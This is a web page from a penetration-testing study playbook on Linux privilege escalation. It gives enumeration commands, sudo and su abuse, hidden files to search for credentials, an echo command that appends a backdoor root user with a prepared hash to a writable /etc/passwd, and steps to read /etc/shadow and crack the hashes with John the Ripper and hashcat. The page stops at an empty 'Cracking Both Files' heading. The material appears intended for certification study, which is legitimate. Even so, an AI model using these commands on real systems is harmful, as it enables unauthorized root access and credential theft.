<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-osep/Linux/Privilege Escalation" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.9.2">
<title data-rh="true">Privilege Escalation | OSEP Playbook</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:url" content="https://hkrsanjeet.github.io/OSEP-Playbook/docs/osep/Linux/Privilege Escalation"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Privilege Escalation | OSEP Playbook"><meta data-rh="true" name="description" content="Privilege Escalation"><meta data-rh="true" property="og:description" content="Privilege Escalation"><link data-rh="true" rel="icon" href="/OSEP-Playbook/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://hkrsanjeet.github.io/OSEP-Playbook/docs/osep/Linux/Privilege Escalation"><link data-rh="true" rel="alternate" href="https://hkrsanjeet.github.io/OSEP-Playbook/docs/osep/Linux/Privilege Escalation" hreflang="en"><link data-rh="true" rel="alternate" href="https://hkrsanjeet.github.io/OSEP-Playbook/docs/osep/Linux/Privilege Escalation" hreflang="x-default"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Privilege Escalation","item":"https://hkrsanjeet.github.io/OSEP-Playbook/docs/osep/Linux/Privilege Escalation"}]}</script><link rel="stylesheet" href="/OSEP-Playbook/assets/css/styles.07dfdec4.css">
<script src="/OSEP-Playbook/assets/js/runtime~main.8d70029c.js" defer="defer"></script>
<script src="/OSEP-Playbook/assets/js/main.a9b7b218.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<svg style="display: none;"><defs>
<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",t||"light"),document.documentElement.setAttribute("data-theme-choice",t||"light")}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/OSEP-Playbook/"><b class="navbar__title text--truncate">OSEP-PLAYBOOK</b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/OSEP-Playbook/docs/osep/scanning/external-nmap">Docs</a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><div class="navbarSearchContainer_Bca1"><div class="navbar__search searchBarContainer_NW3z" dir="ltr"><input placeholder="Search" aria-label="Search" class="navbar__search-input searchInput_YFbd" value=""><div class="loadingRing_RJI3 searchBarLoadingRing_YnHq"><div></div><div></div><div></div><div></div></div></div></div><a href="https://github.com/hkrsanjeet/OSEP-Playbook" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="system mode" aria-label="Switch between dark and light mode (currently system mode)"><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill="currentColor" d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"></path></svg></button></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role="button" aria-expanded="true" href="/OSEP-Playbook/docs/osep/scanning/external-nmap"><span title="OSEP" class="categoryLinkLabel_W154">OSEP</span></a></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/OSEP-Playbook/docs/osep/scanning/external-nmap"><span title="Scanning" class="categoryLinkLabel_W154">Scanning</span></a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/OSEP-Playbook/docs/osep/initial-access/phishing/send-emails"><span title="Initial &amp; Further Access" class="categoryLinkLabel_W154">Initial &amp; Further Access</span></a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/OSEP-Playbook/docs/osep/Tunneling/Ligolo-ng"><span title="Tunneling" class="categoryLinkLabel_W154">Tunneling</span></a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/OSEP-Playbook/docs/osep/Privilege Escalation/Access Tokens - SeImpersonate"><span title="Privilege Esclation" class="categoryLinkLabel_W154">Privilege Esclation</span></a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/OSEP-Playbook/docs/osep/Defense Evasion/Disable AMSI"><span title="Defense Evasion" class="categoryLinkLabel_W154">Defense Evasion</span></a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/OSEP-Playbook/docs/osep/Credentials/Cracking Hashes"><span title="Credentials" class="categoryLinkLabel_W154">Credentials</span></a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role="button" aria-expanded="true" tabindex="0" href="/OSEP-Playbook/docs/osep/Linux/Initial Access"><span title="Linux" class="categoryLinkLabel_W154">Linux</span></a></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/OSEP-Playbook/docs/osep/Linux/Initial Access"><span title="Initial Access" class="linkLabel_WmDU">Initial Access</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/OSEP-Playbook/docs/osep/Linux/Lateral Movement"><span title="Lateral Movement" class="linkLabel_WmDU">Lateral Movement</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/OSEP-Playbook/docs/osep/Linux/Payloads"><span title="Payloads" class="linkLabel_WmDU">Payloads</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/OSEP-Playbook/docs/osep/Linux/Privilege Escalation"><span title="Privilege Escalation" class="linkLabel_WmDU">Privilege Escalation</span></a></li></ul></li></ul></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/OSEP-Playbook/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">OSEP</span></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">Linux</span></li><li class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link">Privilege Escalation</span></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>Privilege Escalation</h1></header><h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="privilege-escalation"><strong>Privilege Escalation</strong><a href="#privilege-escalation" class="hash-link" aria-label="Direct link to privilege-escalation" title="Direct link to privilege-escalation" translate="no">​</a></h3>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="enumeration"><strong>Enumeration</strong><a href="#enumeration" class="hash-link" aria-label="Direct link to enumeration" title="Direct link to enumeration" translate="no">​</a></h3>
<table><thead><tr><th>Enumeration Type</th><th>Command(s)</th><th>Description</th></tr></thead><tbody><tr><td><strong>Current user</strong></td><td><code>id</code></td><td>Displays user ID, group ID, and privileges of the current user.</td></tr><tr><td><strong>Hostname</strong></td><td><code>hostname</code></td><td>Shows the name of the system&#x27;s host.</td></tr><tr><td><strong>OS versions and architecture</strong></td><td><code>cat /etc/issue</code>, <code>cat /etc/os-release</code>, <code>uname -a</code></td><td>Displays the operating system version, release info, and kernel architecture.</td></tr><tr><td><strong>Running processes</strong></td><td><code>ps aux</code></td><td>Lists all running processes with their users, CPU usage, and other details.</td></tr><tr><td><strong>Network interfaces, routes, connections, open ports</strong></td><td><code>ip a</code>, <code>ss -anp</code></td><td>Lists network interfaces, IP addresses, routing tables, and open ports.</td></tr><tr><td><strong>Firewall rules</strong></td><td><code>cat /etc/iptables/rules.v4</code></td><td>Displays the current iptables firewall rules (if applicable).</td></tr><tr><td><strong>Scheduled cron tasks</strong></td><td><code>ls -lah /etc/cron*</code>, <code>crontab -l</code>, <code>sudo crontab -l</code></td><td>Lists scheduled cron jobs for the system and users.</td></tr><tr><td><strong>Installed applications</strong></td><td><code>dpkg -l</code></td><td>Shows installed packages and versions on Debian-based systems.</td></tr><tr><td><strong>Sensitive writable files</strong> (excluding <code>/dev/null</code>)</td><td><code>find / -writable -type d 2&gt;/dev/null</code></td><td>Searches for directories that are writable by the current user.</td></tr><tr><td><strong>In memory passwords</strong></td><td>`strings /dev/mem -n10</td><td>grep -i PASS`</td></tr><tr><td><strong>Find sensitive files</strong></td><td>`locate password</td><td>more`</td></tr><tr><td><strong>Mounted drives</strong></td><td><code>cat /etc/fstab</code>, <code>mount</code>, <code>lsblk</code></td><td>Lists currently mounted drives and their mount points.</td></tr><tr><td><strong>Device drivers and kernel modules</strong></td><td><code>lsmod</code>, <code>/sbin/modinfo &lt;driver_name&gt;</code></td><td>Lists loaded kernel modules and displays info about a specific module.</td></tr><tr><td><strong>SUID binaries</strong></td><td><code>find / -perm -u=s -type f 2&gt;/dev/null</code>, <code>sudo -l</code>, <code>sudo -i</code></td><td>Finds files with the SUID bit set, which could be used to escalate privileges.</td></tr><tr><td><strong>Automated enumeration</strong></td><td>Transfer and run <code>unix-privesc-check</code></td><td>Automates privilege escalation checks on the system.</td></tr><tr><td></td><td></td><td></td></tr></tbody></table>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="abusingsuids"><strong>Abusing <em>SUIDs</em></strong><a href="#abusingsuids" class="hash-link" aria-label="Direct link to abusingsuids" title="Direct link to abusingsuids" translate="no">​</a></h3>
<p><strong>Check what we can run as sudo without password</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-l</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<p><strong>Execute as other users</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># As root: when NOPASSWD is allowed</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">su</span><span class="token plain"> -</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># As other specific user</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">su</span><span class="token plain"> - </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">username</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">su</span><span class="token plain"> - </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">username</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">su</span><span class="token plain"> - </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">username</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-c</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;[command]&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<p><strong>All Possible SUID to Exploit</strong> are available in this page <a href="https://gtfobins.github.io/" target="_blank" rel="noopener noreferrer" class=""><em>GTFOBins</em></a>.</p>
<p><strong>Inspect syslog file for process relevant events</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">grep</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">process_name</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> /var/log/syslog</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="important-files"><strong>Important Files</strong><a href="#important-files" class="hash-link" aria-label="Direct link to important-files" title="Direct link to important-files" translate="no">​</a></h3>
<p><strong>Check the dot hidden files</strong>, usually we could find private keys for SSH keys or hardcoded credentials</p>
<ul class="contains-task-list containsTaskList_mC6p">
<li class="task-list-item"><input type="checkbox" disabled=""> <!-- --> <code>.bashrc</code></li>
<li class="task-list-item"><input type="checkbox" disabled=""> <!-- --> <code>.bash_profile</code></li>
<li class="task-list-item"><input type="checkbox" disabled=""> <!-- --> <code>.mysql_history</code></li>
<li class="task-list-item"><input type="checkbox" disabled=""> <!-- --> <code>.ssh</code></li>
<li class="task-list-item"><input type="checkbox" disabled=""> <!-- --> <code>.enc</code></li>
<li class="task-list-item"><input type="checkbox" disabled=""> <!-- --> Any other relevant file you may find</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="password-files"><strong>Password Files</strong><a href="#password-files" class="hash-link" aria-label="Direct link to password-files" title="Direct link to password-files" translate="no">​</a></h3>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="etcpasswd"><em><strong>/etc/passwd</strong></em><a href="#etcpasswd" class="hash-link" aria-label="Direct link to etcpasswd" title="Direct link to etcpasswd" translate="no">​</a></h3>
<p>The misconfiguration is if we have permissions to edit this file, which we should not have, in which case we will modify it to <strong>add a new root user</strong>.</p>
<ol>
<li class="">Create the hash</li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">openssl </span><span class="token function" style="color:#d73a49">passwd</span><span class="token plain"> Password123</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ol>
<li class="">Add the hash to the <code>/etc/passwd</code> file</li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># This is just an example using the output of the previous command.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">echo</span><span class="token string" style="color:#e3116c">&quot;newroot:</span><span class="token string variable" style="color:#36acaa">$6</span><span class="token string variable" style="color:#36acaa">$rounds</span><span class="token string" style="color:#e3116c">=656000</span><span class="token string variable" style="color:#36acaa">$6B8ZJQ4aK7G9P</span><span class="token string" style="color:#e3116c">/8c</span><span class="token string variable" style="color:#36acaa">$hx0E6ke7zxz1mUMN6LCyRJp2bV5hEE7EowzjEbLXwO6KZV7Ojo0DWg1lzCjLwWg</span><span class="token string" style="color:#e3116c">.0tLGfhFe42NnJ8LMtBzD0:0:0:root:/root:/bin/bash&quot;</span><span class="token operator" style="color:#393A34">&gt;&gt;</span><span class="token plain"> /etc/passwd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ol>
<li class="">Switch to the new user</li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">su</span><span class="token plain"> newroot</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Verify root access</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">id</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="etcshadow"><em><strong>/etc/shadow</strong></em><a href="#etcshadow" class="hash-link" aria-label="Direct link to etcshadow" title="Direct link to etcshadow" translate="no">​</a></h3>
<p>The misconfiguration is that we should not be able to look the contents of this file, if we can do it then we could see the <strong>hashes for the users and crack them</strong>.</p>
<ol>
<li class="">Get the hash out.</li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> /etc/shadow </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">grep</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">root_user</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">root_user</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">_hash.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ol>
<li class="">Crack the hash</li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># John The Ripper</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">john </span><span class="token parameter variable" style="color:#36acaa">--wordlist</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">/usr/share/wordlists/rockyou.txt </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">root_user</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">_hash.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Hashcat, we need to isolate the hash part, for example from above hash would be: $6$rounds=656000$6B8ZJQ4aK7G9P/8c$hx0E6ke7zxz1mUMN6LCyRJp2bV5hEE7EowzjEbLXwO6KZV7Ojo0DWg1lzCjLwWg.0tLGfhFe42NnJ8LMtBzD0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">hashcat </span><span class="token parameter variable" style="color:#36acaa">-m</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1800</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">root_user</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">_hash.txt /usr/share/wordlists/rockyou.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ol>
<li class="">Show the password</li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># John The Ripper</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">john </span><span class="token parameter variable" style="color:#36acaa">--show</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">root_user</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">_hash.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Hashcat</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">hashcat </span><span class="token parameter variable" style="color:#36acaa">-m</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1800</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">root_user</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">_hash.txt /usr/share/wordlists/rockyou.txt </span><span class="token parameter variable" style="color:#36acaa">--show</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="cracking-both-files"><strong>Cracking Both Files</strong><a href="#cracking-both-files" class="hash-link" aria-label="Direct link to cracking-both-files" title="Direct link to cracking-both-files" translate="no">​</a></h3>
